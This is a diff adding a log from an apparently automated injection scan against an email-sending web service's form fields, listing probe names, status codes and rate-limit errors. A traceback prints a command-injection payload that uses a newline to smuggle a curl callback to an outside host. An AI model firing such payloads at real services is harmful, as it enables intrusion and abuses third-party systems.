@@ -1,0 +1,17 @@
+cmdi_fname             code=200 ok=False id=b'{"data":null,"error":{"message":"You have reached your monthly email s'
+cmdi_msg               code=200 ok=False id=b'{"data":null,"error":{"message":"You have reached your monthly email s'
+cmdi_subj              code=200 ok=False id=b'{"data":null,"error":{"message":"You have reached your monthly email s'
+cmdi_cname             code=200 ok=True id=01a0f15c-9191-7163-a08d-4f455814b4a1
+Traceback (most recent call last):
+  File "/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e/tool_outputs/w40_inj.py", line 28, in <module>
+    fire("cmdi_lname",  dict(BASE, lname="a%0acurl http://%s/cmdi5" % H_CMDI))
+                                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~~~~~
+TypeError: not enough arguments for format string
+cmdi_lname             code=200 ok=False id=b'{"data":null,"error":{"statusCode":429,"message":"You have reached you'
+ssti_fname             code=200 ok=True id=01a0f15c-dbc2-7843-a94c-0c4e8ac3c5ec
+ssti_msg               code=200 ok=False id=b'{"data":null,"error":{"message":"You have reached your monthly email s'
+ssti_cname             code=429 ok=False id=b'Too Many Requests\n\nToo Many Requests\nbom1::sndpc-1790755802426-2da0773'
+ssti_subj              code=429 ok=False id=b'Too Many Requests\n\nToo Many Requests\nbom1::zm6tv-1790755808544-1751954'
+sql_subj_dns           code=429 ok=False id=b'Too Many Requests\n\nToo Many Requests\nbom1::pznxj-1790755814694-b309518'
+sql_msg_time           code=200 ok=True id=01a0f15d-5596-756e-a89e-1af8de655613
+done-urlencoded
